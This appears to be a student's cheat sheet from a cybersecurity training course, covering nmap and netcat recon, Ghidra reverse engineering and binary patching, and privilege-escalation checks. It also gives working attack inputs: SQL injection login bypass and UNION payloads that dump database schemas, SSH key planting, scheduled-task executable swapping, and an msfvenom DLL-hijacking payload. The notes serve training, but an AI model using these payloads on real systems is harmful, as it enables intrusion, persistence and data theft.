# CCTC Shared Notes.<br> 
There is an **archive** of previous notes.<br>
Don't know if or when i'll update this agian. Don't expect anything.
Username: `FFLL-201-M`

### Links
[CYBBH](https://os.cybbh.io/public/os/latest/index.html)<br>

# Quick Notes: The SQL

# Analysis

## Network

### Website

Use Inspect Element to find hidden elements or directories

### Nmap

Maps a network or specified IP's.

```plain
nmap <IP/cidr or XXX.XXX.XXX,XXX,XXX,... or IP,IP,... >
```

**Options**

- `-T<0-5>` `0`is slowest and quietest, `5` is fastest and loudest. I**ncreases scan speed.**
- `-Pn` Disables ping scan. Good for keeping a lower profile. **Increases scan speed.**
- `--script=` use different scripts for different tasks
    - `http-enum` scans for potential directories on a website

### Netcat

```plain
nc <host> <port>
```

> `-u` for UDP
> `-l` listen
> `-p` port excludes host

## Binaries

### Strings

Find important strings. Look for Enter and Success messages or other important phrases.

```powershell
-a for ascii, /i for case insensitivestrings.exe -a -nobanner <exe> | findstr /i <string>
```

Find the file header.

```powershell
strings.exe -a -nobanner <File> | select -first 10
```

### Ghidra

1. "File"
2. "New project"
3. Name it
4. "File"
5. "Import File"
6. Click file you wish to analyze
7. "OK"
8. Click imported file in Ghidra
9. Asks to analyze "Yes"
10. "Analyze"
11. From the end of the program, search for messages like enter and success.
    1. Use "Search"
        1. "For Strings"
        2. "Search"
        3. "Filter": input desired search query here
        4. Double click results to see the function the result is contained in
    2. Ctrl+UP/DOWN to move through functions
    3. Double click function calls in the decompiled code to jump to that function

## Device

### Windows

**Services**

Look for misspellings or missing descriptions.

1. "Right Click" on suspected service
2. Click "Properties"
3. Enumerate "Path to executable"

**Task Scheduler**

look for tasks scheduled 

**Audit Logs**

```powershell
auditpol /get /category:* |findstr /i "success failure"
```

**Event Viewer**

find relevant stuff in "Windows Logs" Directory

### Linux

```plain
sudo -l
```

```plain
find / -type f -perm <cmd> 2>/dev/null
```

> /4000 for SUID
> /2000 for SGID
> /6000 for Bofem

```plain
echo $PATH
```

Bash user configs

```plain
PATH=.:$PATH
```

> apends a . to the end of the PATH variable a "." is the current working dir

Has exploits for executables

https://gtfobins.org

***

# Reverse Engineering

## Ghidra Patching

Use Ghidra as admin

> By default, Ghidra has, functions, a disassembler, and a decompiler.

Follow code working backwards, identify potential lines or values to be changed.

1. Right Click the instruction you wish to change
2. "Patch Instruction"
3. Enter Desired Value
4. Export Patched Binary
    1. "File"
    2. "Export Program"
    3. "Format": set to PE for Windows and ELF for Linux
    4. Select location with "Output File"
    5. "OK"

***

# Exploitation

## Binary

## SQL

Auth bypass `'OR 1='1`

> Type this into a website login prompt

`<URL><Dir>?<Validcmd> UNION SELECT`

```sql
1,table_name,3 FROM information_schema.tables
```

> Displays all table names in the database

```sql
1,table_schema,table_name FROM information_schema.tables
```

> Displays all databases and the names of their tables

```sql
table_name,1,column_name FROM information_schema.columns
```

> Display all tables and the columns they contain

```sql
table_schema,column_name,table_name FROM information_schema.columns #
```

> "Golden" statement

```sql
null,name,color FROM car
```

> Using information pulled from the Golden Statement to query a different table

## SSH Key Access

when accessing a filesys you can find the current user there home folder create .ssh/authorized_keys (cat your .pub sshkey) put it in there

## Task scheduler

Take an exe being run with and action and replace that file by renaming it and replacing it with yours

## DLL Hijacking

use this to inject commands to hide in plain sight

```powershell
msfvenom -p windows/exec CMD='cmd.exe /C "ls" > C:\Users\Student\Desktop\whoami.txt' -f dll > SSPICLI.dll
```

# Access

## SCP

```javascript
scp -r -P <port_number> <source> <destination>
```

> `-r` for recursive
> source and destination are formatted:
> `<IP>:<Directory>` if local exclude `<IP>:`

## Xfreerdp

```plain
xfreerdp /v:<ip_address> /u:<username> /p:<password> /dynamic-resolution +clipboard
```

> can use proxychains
